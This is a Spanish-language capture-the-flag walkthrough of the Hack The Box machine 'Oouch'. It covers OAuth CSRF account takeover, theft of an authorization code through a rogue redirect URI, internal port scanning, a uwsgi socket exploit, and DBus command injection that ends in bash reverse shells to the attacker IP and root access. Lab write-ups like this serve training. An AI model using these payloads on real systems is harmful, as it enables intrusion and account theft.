# 10.10.10.177 - Oouch
-----------------------

Puertos abiertos 21(ftp) 22(ssh), 5000(http, nginx), 8000(rstp?)

```console
└─$ ftp 10.10.10.177
Name (10.10.10.177:cucuxii): anonymous
230 Login successful.
ftp> dir
-rw-r--r--    1 ftp      ftp            49 Feb 11  2020 project.txt
ftp> prompt of
ftp> mget *
```

Si abrimos el project.txt dice que:
```console
Flask -> Consumer
Django -> Authorization Server
```

Al intentar acceder al servidor montado en el puerto 8000 me da un error 400 bad request (incluso intentando por
POST)

---------------------------
## Web del puerto 5000 (nginx)

Al entrar nos topamos con un panel de login, con la opción de registro, lo primero que nos llama la atención es
la url ```http://10.10.10.177:5000/login?next=%2F```

```console
└─$ php --interactive
php > echo(urldecode("%2f")); # /
```
Intentamos varias cosas como ```next=/../../../../, next=https://google.com next=1 next='``` pero no hace nada.
Si le damos al boton home sale -> ```login?next=%2Fhome``` pero seguimos en login.

Si nos registramos cucuxii:cucuxii@cucuxii.htb nos dan mas opciones.

Inspeccionando el codigo fuente para buscar cosas ocultas nos encontramos con un csrf_token y poca cosa más.
```<input id="csrf_token" name="csrf_token" type="hidden" value="IjExZWQ2YjFlN2FlNDhjYzg5MjI1...">```

Nuestro usuario arrastra una cookie de sesion pero que al decodificarla en jwt.io da bytes sin sentido.

Si investigamos la web:
- /profile # Nos habla que no tenemos cuentas conectadas
- /password change # para cambiar la contraseña
- /documents # solo disponible para usaurios administradores
- /about # Habla de un authorization server y un sistema de autorización a traves de varias aplicaciones.
- /contact # /POST a /contact con los datos {'textfield':'test', 'submit':'send'} y el csrf token.
- /password_change # POST con los datos 'opassword' (antigua contr.) 'npassword'(nueva) y 'cpassword'(nueva)

Como hay una seccion de contacto y una de cambiar la contraseña, podemos intentar cambiarsela a un posible admin.
Si tramitamos la peticion de cambiar contraseña por bupsuite:

```
csrf_token=ImQ5ND...&opassword=cucuxii&npassword=test&cpassword=test&submit=Change+Password
# Quitamos el campo opassword -> csrf_token=ImQ5ND...&npassword=test&cpassword=test&submit=Change+Password
# Error "Este campo es obligatorio"

# Cambiar el metodo POST a GET (para hacer un enlace que mandarle al admin y cambiarle SU contraseña)
GET /password_change?csrf_token=ImQ5N&opassword=cucuxii&npassword=test&cpassword=test&submit=Change+Password
# NO funciona porque no me deja entrar con la nueva contraseña "test" sino la vieja "cucuxii"
```

Intento de XSS en el campo /contact:
```
Contact -> "<script src="http://10.10.14.16/pwn.js"></script>"
# Intento de hackeo detectado.
# "Querido hacker, como dijimos este sitio sigue los estandares de seguridad mas altos y te hemos bloqueado la IP durante un minuto, jodete"

Contact -> "http://10.10.14.16/pwn.js"
# Peticion /GET
```

Si hacemos fuzzing con el diccionario de siempre no tendremos resultados, en cambio con el de common-routes si
```console
└─$ wfuzz -t 200 --hc=404,400,502 -w /usr/share/seclists/Discovery/Web-Content/common.txt http://10.10.10.177:5000/FUZZ
# 000002867:   302        3 L      24 W       247 Ch      "oauth"
```

Este endpoint es de Oauth.
```
Endopoint de Oauth

Esta funcionalidad está todavia en desarollo... pero si has encontrado esta ruta esque eres desarollador.
Para conectar tu cuenta a nuestro servidor de autorización:
	->  http://consumer.oouch.htb:5000/oauth/connect

Una vez conectada deberias poder ysar el servidor de autorizacion para loguearte con:
	-> http://consumer.oouch.htb:5000/oauth/login
```
---------------------------------

# Extra: Que es oauth

El mecanismo Oauth se creó para que una web pueda acceder a información de otra por un permiso especial que 
le ha otorgado el usaurio. Por ejemplo conectar cuentas, intercambiar datos... Ese permiso o token, es limitado, 
y tras de él, se envian esos datos sensibles.

<-------- Diagrama ----------->

-----------------------------

# 

Si le damos al enlace de /connect
```
GET /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read 

http://authorization.oouch.htb:8000/login/
```

En authorization.oouch.htb/login al poner nuestras creds del otro lado no funcionan.
Esto es otro subdominio, asi que si quitamos lo de /login y se queda en authorization.oouch.htb:8000/
```
Oouch es un seridor simple de autorizacion bassado en Oauth2. Crea una cuenta en Oocuh y usala para varias 
aplicaciones
	Login : /login
	Registro: /signup
```
Una vez nos registramos con cucuxii:contraseña123.
Ahi nos dan dos urls 
 - oauth/authorize
 - oauth/token

Pero estan disfuncionales los dos. Si buscamos mas
```console
└─$ wfuzz -t 200 --hc=404,400,502 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://authorization.oouch.htb:8000/oauth/FUZZ
000000672:   301        0 L      0 W        0 Ch        "applications"
000018405:   301        0 L      0 W        0 Ch        "token"
```
 - applications nos piden creds.

-------------------------------

Si le damos otra vez a http://consumer.oouch.htb:5000/oauth/connect desde consumer.oouch.htb nos sale un panel
de autorizacíon:
Con burpsuite
```
POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read

csrfmiddlewaretoken=Ma6WomfLbKMIrqt05Xo9IkeHmhCWqrBAiBE4nfC8fxkqNMpkvYWhaRyD79h2sgiA&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize
[Forward]

GET /oauth/connect/token?code=0HEcoYFa5Kde7MDN6aERyfcQgJTdWM HTTP/1.1
[No darle a Forward]
```
Si copiamos el enlace de GET sin darle a forward y lo metemos en la parte de contacto
```http://consumer.oouch.htb:5000/oauth/connect/token?code=0HEcoYFa5Kde7MDN6aERyfcQgJTdWM```

Te deslogueas y te logueas otra vez pero con el /oauth/login en vez del /login (O sea por oauth)
Por tanto entras con la cuenta "qtc:qtc@nonexistend.nonono"

---------------------------------
Esta persona en /Documents tiene
```
dev_access.txt -> develop:supermegasecureklarabubu123! -> Permite registrar una aplicación
o_auth_notes.txt -> /api/get_user -> user data. oauth/authorize -> Now also supports GET method.
todo.txt -> Crhis menciono que todos los usuarois pueden obtener mi llave ssh... debe ser una broma. 
```

En /applications no nos deja con las creds estas.
Pero si vamos a /applicat2ions/register si que funcionan.

id: Cn55qW8DMDIvhWLkJLECtX0iJtNILk3WJgwiGmrA
secret: cwsC3srw1taHAvg0xnOMYHsSPyn8gas7ZrapAlMffMEIY1vygjkfAkPNarxwgE792gmt4temsYp1UF2u5AyEIinjMyR6zL8Di408gQyrS1tlO8B88ZGwlvw59O4Ltzwk
redirect_uri: http://10.10.14.16/test
url: http://authorization.oouch.htb:8000/oauth/applications/2/

Nos vamos otra vez a /oauth/connect e interceptamos al darle a authorize. Ponemos los datos de redirect_uri y
client id que hemos sacado de la aplicacion
Camibamos de POST a GET quedanose como
```
GET /oauth/authorize/?client_id=Cn55qW8DMDIvhWLkJLECtX0iJtNILk3WJgwiGmrA&response_type=code&redirect_uri=http://10.10.14.16/test&scope=read&state=&allow=Authorize
```
Ahora le mandamos por /contact
```http://authorization.oouch.htb:8000/oauth/authorize/?client_id=Cn55qW8DMDIvhWLkJLECtX0iJtNILk3WJgwiGmrA&response_type=code&redirect_uri=http://10.10.14.16/test&scope=read&state=&allow=Authorize```

```console
└─$ sudo nc -nlvp 80
Ncat: Connection from 10.10.10.177:33156.
GET /test?code=fe7kjqU3BT9WIYeQ8DNQns5DTXxLR6 HTTP/1.1
Cookie: sessionid=cit35r8dujmo87ihnjaa9l250zt2t6yu;

└─$ curl http://authorization.oouch.htb:8000/oauth/token/ -d 'client_id=Cn55qW8DMDIvhWLkJLECtX0iJtNILk3WJgwiGmrA&client_secret=cwsC3srw1taHAvg0xnOMYHsSPyn8gas7ZrapAlMffMEIY1vygjkfAkPNarxwgE792gmt4temsYp1UF2u5AyEIinjMyR6zL8Di408gQyrS1tlO8B88ZGwlvw59O4Ltzwk&redirect_uri=http://10.10.14.16/test&code=fe7kjqU3BT9WIYeQ8DNQns5DTXxLR6&grant_type=authorization_code'
{"access_token": "7hOVKU8cCfq54uX3YhqMWBevyrD8Eg", "expires_in": 600, "token_type": "Bearer", "scope": "read", "refresh_token": "T6jt9EMTaFyeUoeSHHACdul2zG074X"} 

└─$ curl -s http://authorization.oouch.htb:8000/api/get_user -H "Authorization: Bearer 7hOVKU8cCfq54uX3YhqMWBevyrD8Eg"
{"username": "qtc", "firstname": "", "lastname": "", "email": "qtc@nonexistend.nonono"}
```




------------------------------------------
En nuestro /home hay una .note.txt (archivo oculto) que dice así:
```Implementando un IPS usando DBus e iptables == Genio?```
Si habla de iptables se referirá a lo de bloquear el intento de hackeo de la sección contact

ps -aux dice que:
```
\_ /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 5000 -container-ip 172.18.0.4 -container-port 5000
\_ /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8000 -container-ip 172.18.0.5 -container-port 8000
```
Tambien hostname:
```console
qtc@oouch:/tmp$ hostname -I
10.10.10.177 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:134b 
```
```console
qtc@oouch:/tmp$ for i in {1..254}; do (ping -c 1 172.18.0.$i | grep "bytes from" | grep -v "unreachable"&); done;
64 bytes from 172.18.0.1: icmp_seq=1 ttl=64 time=0.082 ms
64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.187 ms
64 bytes from 172.18.0.3: icmp_seq=1 ttl=64 time=0.096 ms
64 bytes from 172.18.0.4: icmp_seq=1 ttl=64 time=0.046 ms
64 bytes from 172.18.0.5: icmp_seq=1 ttl=64 time=0.063 ms
```

```
#!/bin/bash
ips=(172.18.0.1 172.18.0.2 172.18.0.3 172.18.0.4 172.18.0.5)
for ip in ${ips[@]}; do
    echo "Escaneando host: $ip"
    for port in $(seq 1 10000); do
        timeout 1 bash -c "(echo "" > /dev/tcp/$ip/$port) 2>/dev/null" && echo " > Port $port" &
    done; wait
done;
```
```console
Escaneando host: 172.18.0.1 # Puerto 21, 22, 5000 y 8000
Escaneando host: 172.18.0.2 # Puerto 3306 (sql)
Escaneando host: 172.18.0.3 # Puerto 3306 (sql)
Escaneando host: 172.18.0.4 # Puerto 22, 5000
Escaneando host: 172.18.0.5 # Puerto 8000
```
El tema de las iptables está en la 4
```console
qtc@oouch:~$ ssh qtc@172.18.0.4
qtc@b14c1692af51:/code/oouch$ grep -rIe "hacker" 2>/dev/null # Encuentro la ruta code/oouch
```

```
sys.path.insert(0, "/usr/lib/python3/dist-packages")
import dbus
regex = re.compile("((?:http(s)?:\/\/)?[\w.-]+(?:\.[\w\.-]+)+[\w\-\._~:/?#[\]@!\$&'\(\)\*\+,;=
primitive_xss = re.compile("(<script|<img|<svg|onload|onclick|onhover|onerror|<iframe|<html|al
")

@app.route('/contact', methods=['GET', 'POST'])
@login_required
def contact():
    form = ContactForm()
    if form.validate_on_submit():
        if primitive_xss.search(form.textfield.data):
            bus = dbus.SystemBus()
            block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
            block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
            client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
            response = block_iface.Block(client_ip)
            bus.close()
            return render_template('hacker.html', title='Hacker')
```
```console 
qtc@b14c1692af51:/code/oouch$ python
>>> import sys
>>> sys.path.insert(0, "/usr/lib/python3/dist-packages")
>>> import dbus
>>> bus = dbus.SystemBus()
>>> block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
>>> block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
>>> client_ip = '; ping -c 1 10.10.14.16; #'
>>> response = block_iface.Block(client_ip) # error bajos privilegios
>>> exit()

qtc@b14c1692af51:/code/oouch$ cat /etc/nginx/nginx.conf
user www-data;
        location / {
            include uwsgi_params;
            uwsgi_pass unix:/tmp/uwsgi.socket;
        }
...

[wsgi exploit](https://raw.githubusercontent.com/wofeiwo/webcgi-exploits/master/python/uwsgi_exp.py)
```console
qtc@b14c1692af51:/tmp$ cat << EOF >> exploit.py
> #!/usr/bin/python
...
> if __name__ == '__main__':
>     main()
> EOF

qtc@b14c1692af51:/tmp$ python exploit.py -m unix -u /tmp/uwsgi.socket -c "whoami"
# ModuleNotFoundError: No module named 'bytes'

qtc@b14c1692af51:/tmp$ sed -i "/import bytes/d" exploit.py
qtc@b14c1692af51:/tmp$ python exploit.py -m unix -u /tmp/uwsgi.socket -c "bash -c 'bash -i >& /dev/tcp/10.10.14.16/6666 0>&1'"
```
Con netcat obtenemos la shell en el puerto 6666 ```sudo nc -nlvp 6666```
Al hacer otra vez
```
>>> import sys; sys.path.insert(0, "/usr/lib/python3/dist-packages"); import dbus
>>> bus = dbus.SystemBus()
>>> block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
>>> block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
>>> client_ip = '; ping -c 1 10.10.14.16 #'
>>> response = block_iface.Block(client_ip)
#tenemos traza por tcpdump

>>> client_ip = '; bash -c "bash -i >& /dev/tcp/10.10.14.16/443 0>&1" #'
>>> response = block_iface.Block(client_ip)
# Shell como root en la máquina -> sudo nc -nlvp 443
```

